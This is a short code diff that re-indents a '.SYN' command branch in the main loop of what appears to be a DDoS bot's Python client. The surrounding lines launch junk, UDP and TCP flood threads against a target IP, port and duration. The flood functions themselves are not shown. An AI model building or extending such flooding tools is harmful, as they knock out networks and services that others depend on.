@@ -516,7 +516,8 @@ def main():
                         threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                         threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                         threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
-           elif command == '.SYN':
+
+                elif command == '.SYN':
                     ip = args[1]
                     port = int(args[2])
                     secs = time.time() + int(args[3])
